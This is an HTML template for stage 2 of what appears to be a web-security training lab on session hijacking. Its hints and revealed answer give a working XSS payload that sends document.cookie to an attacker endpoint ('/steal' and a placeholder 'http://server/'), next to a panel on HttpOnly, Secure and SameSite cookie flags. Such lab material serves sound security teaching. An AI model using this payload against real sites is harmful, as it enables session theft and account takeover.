<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <title>Stage 2: Stealing the Session - Session Hijacking</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        .story-box {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border-left: 4px solid #e91e63;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 0 10px 10px 0;
        }
        .story-narrator { color: #e91e63; font-style: italic; }
        .hint-revealer {
            background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
            border: 1px dashed #e91e63;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
        }
        .hint-level {
            display: none;
            padding: 10px;
            margin-top: 10px;
            background: rgba(233, 30, 99, 0.1);
            border-left: 3px solid #e91e63;
            border-radius: 0 5px 5px 0;
        }
        .hint-level.revealed { display: block; animation: fadeIn 0.3s ease; }
        .answer-reveal {
            display: none;
            padding: 15px;
            margin-top: 10px;
            background: rgba(220, 53, 69, 0.2);
            border: 1px solid #dc3545;
            border-radius: 5px;
        }
        .answer-reveal.revealed { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .hint-btn { margin: 2px; }
        .stage-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .stage-indicator { display: flex; gap: 10px; align-items: center; }
        .stage-dot {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 0.9rem;
        }
        .stage-dot.active { background: #e91e63; color: #fff; }
        .stage-dot.completed { background: #28a745; color: #fff; }
        .stage-dot.pending { background: #343a40; color: #6c757d; border: 2px solid #6c757d; }
        .success-banner {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            animation: celebrate 0.5s ease;
        }
        .victim-card {
            background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
            border: 2px solid #6c757d;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }
        .attacker-card {
            background: linear-gradient(135deg, #4a1a1a 0%, #2d1a1a 100%);
            border: 2px solid #dc3545;
            border-radius: 10px;
            padding: 20px;
        }
        .avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            margin: 0 auto 15px;
        }
        .victim-avatar { background: linear-gradient(135deg, #6c757d, #343a40); }
        .attacker-avatar { background: linear-gradient(135deg, #dc3545, #721c24); }
        .cookie-display {
            background: #0d1117;
            border: 1px solid #ffc107;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
            font-size: 0.85rem;
        }
        .data-flow {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        .flow-arrow {
            font-size: 2rem;
            color: #dc3545;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body data-bs-theme="dark">
<nav class="navbar navbar-expand-lg bg-body-tertiary mb-4">
    <div class="container-fluid">
        <a class="navbar-brand" href="/"><i class="bi bi-shield-lock"></i> Web Security Demo</a>
        <span class="badge text-dark fs-6" style="background: #e91e63;">
            <i class="bi bi-person-badge"></i> The Identity Thief - Stage 2
        </span>
    </div>
</nav>

<div class="container">
    <!-- Stage Navigation -->
    <div class="stage-nav">
        <a href="/attack_chain_2/stage1" class="btn btn-outline-secondary">
            <i class="bi bi-arrow-left"></i> Previous Stage
        </a>
        <div class="stage-indicator">
            <a href="/attack_chain_2/stage1" class="stage-dot completed text-decoration-none">1</a>
            <i class="bi bi-arrow-right text-success"></i>
            <div class="stage-dot active">2</div>
            <i class="bi bi-arrow-right text-muted"></i>
            <a href="/attack_chain_2/stage3" class="stage-dot pending text-decoration-none">3</a>
        </div>
        <a href="/attack_chain_2/stage3" class="btn btn-outline-warning">
            Next Stage <i class="bi bi-arrow-right"></i>
        </a>
    </div>

    <!-- Stage Header -->
    <div class="text-center mb-4">
        <h1><i class="bi bi-2-circle-fill" style="color: #e91e63;"></i> Stealing the Session</h1>
        <p class="lead text-muted">Session Hijacking Attack</p>
    </div>

    <!-- Story Box -->
    <div class="story-box">
        <h4><i class="bi bi-cookie"></i> The Mission</h4>
        <p class="story-narrator">
            "You've injected XSS code. Now it's time to weaponize it! Your malicious script needs to steal the 
            victim's session cookie and send it to your server. Once you have their session token, you can 
            impersonate them without knowing their password. Craft a payload that exfiltrates cookies..."
        </p>
    </div>

    {% if session_stolen %}
    <div class="success-banner mb-4">
        <h3><i class="bi bi-trophy"></i> Stage 2 Complete!</h3>
        <p class="mb-0">You've successfully exfiltrated the session cookie!</p>
        <a href="/attack_chain_2/stage3" class="btn btn-light mt-3">
            <i class="bi bi-arrow-right-circle"></i> Proceed to Stage 3: CSRF Attack
        </a>
    </div>
    {% endif %}

    <!-- Data Flow Visualization -->
    <div class="data-flow mb-4">
        <div class="victim-card" style="width: 200px;">
            <div class="avatar victim-avatar"><i class="bi bi-person"></i></div>
            <strong>Victim</strong>
            <div class="cookie-display mt-2" id="victim-cookie">session=abc123xyz</div>
        </div>
        <div class="flow-arrow"><i class="bi bi-arrow-right-circle-fill"></i></div>
        <div class="attacker-card" style="width: 200px; text-align: center;">
            <div class="avatar attacker-avatar"><i class="bi bi-incognito"></i></div>
            <strong>Attacker's Server</strong>
            <div class="cookie-display mt-2 text-danger" id="stolen-cookie">{{ stolen_cookie or 'Waiting...' }}</div>
        </div>
    </div>

    <div class="row">
        <!-- XSS Payload Builder -->
        <div class="col-md-6 mb-4">
            <div class="card border-danger h-100">
                <div class="card-header bg-danger text-white">
                    <strong><i class="bi bi-bug"></i> Craft Your Payload</strong>
                    <span class="badge bg-dark float-end">Cookie theft</span>
                </div>
                <div class="card-body">
                    <p class="small text-muted">
                        Build an XSS payload that sends cookies to your server at <code>/steal</code>
                    </p>
                    
                    <form method="get">
                        <div class="mb-3">
                            <label class="form-label">XSS Payload:</label>
                            <textarea class="form-control font-monospace" name="payload" rows="4">{{ payload or '' }}</textarea>
                        </div>
                        <button type="submit" class="btn btn-danger w-100">
                            <i class="bi bi-play-fill"></i> Execute Payload
                        </button>
                    </form>
                    
                    {% if payload_result %}
                    <div class="alert {{ 'alert-success' if 'stolen' in payload_result|lower else 'alert-warning' }} mt-3 mb-0">
                        {{ payload_result }}
                    </div>
                    {% endif %}
                    
                    <!-- Progressive Hints System -->
                    <div class="hint-revealer">
                        <div class="d-flex justify-content-between align-items-center flex-wrap gap-2">
                            <strong><i class="bi bi-puzzle"></i> Need Help?</strong>
                            <div>
                                <button class="btn btn-sm btn-outline-warning hint-btn" onclick="revealHint(1)">Hint 1</button>
                                <button class="btn btn-sm btn-outline-warning hint-btn" onclick="revealHint(2)">Hint 2</button>
                                <button class="btn btn-sm btn-outline-warning hint-btn" onclick="revealHint(3)">Hint 3</button>
                                <button class="btn btn-sm btn-outline-danger hint-btn" onclick="revealAnswer()">ðŸš¨ Reveal Answer</button>
                            </div>
                        </div>
                        <div id="hint-1" class="hint-level">
                            <i class="bi bi-lightbulb text-warning"></i> <strong>Hint 1:</strong> 
                            You can make the browser load an image from any URL. What if that URL contains cookie data?
                        </div>
                        <div id="hint-2" class="hint-level">
                            <i class="bi bi-lightbulb text-warning"></i> <strong>Hint 2:</strong> 
                            <code>new Image().src = "http://server/?data=" + document.cookie</code> sends cookies to a server.
                        </div>
                        <div id="hint-3" class="hint-level">
                            <i class="bi bi-lightbulb text-warning"></i> <strong>Hint 3:</strong> 
                            Your attacker server is at <code>/steal</code>. Construct: <code>&lt;script&gt;new Image().src='/steal?cookie='+document.cookie&lt;/script&gt;</code>
                        </div>
                        <div id="answer" class="answer-reveal">
                            <strong><i class="bi bi-key-fill text-danger"></i> Answer:</strong>
                            <div class="mt-2">
                                <code class="bg-dark p-2 d-block rounded">&lt;script&gt;new Image().src='/steal?cookie='+document.cookie&lt;/script&gt;</code>
                                <small class="text-muted mt-2 d-block">This creates an invisible image request that sends the cookies to your server!</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Defense Side -->
        <div class="col-md-6 mb-4">
            <div class="card border-success h-100">
                <div class="card-header bg-success text-white">
                    <strong><i class="bi bi-shield-lock"></i> Defense Mechanisms</strong>
                    <span class="badge bg-dark float-end">HttpOnly cookies</span>
                </div>
                <div class="card-body">
                    <h5><i class="bi bi-cookie"></i> Cookie Security Flags</h5>
                    
                    <div class="alert alert-info mb-3">
                        <strong>HttpOnly Flag:</strong><br>
                        <code>Set-Cookie: session=abc; HttpOnly</code><br>
                        <small>Prevents JavaScript from accessing the cookie!</small>
                    </div>
                    
                    <div class="alert alert-info mb-3">
                        <strong>Secure Flag:</strong><br>
                        <code>Set-Cookie: session=abc; Secure</code><br>
                        <small>Cookie only sent over HTTPS</small>
                    </div>
                    
                    <div class="alert alert-info mb-3">
                        <strong>SameSite Flag:</strong><br>
                        <code>Set-Cookie: session=abc; SameSite=Strict</code><br>
                        <small>Prevents cross-site request attacks</small>
                    </div>
                    
                    <div class="alert alert-warning mb-0">
                        <strong><i class="bi bi-lightbulb"></i> Best Practice:</strong>
                        Combine all three: <code>HttpOnly; Secure; SameSite=Strict</code>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
function revealHint(num) {
    for (let i = 1; i <= num; i++) {
        document.getElementById('hint-' + i).classList.add('revealed');
    }
}

function revealAnswer() {
    for (let i = 1; i <= 3; i++) {
        document.getElementById('hint-' + i).classList.add('revealed');
    }
    document.getElementById('answer').classList.add('revealed');
}
</script>
</body>
</html>
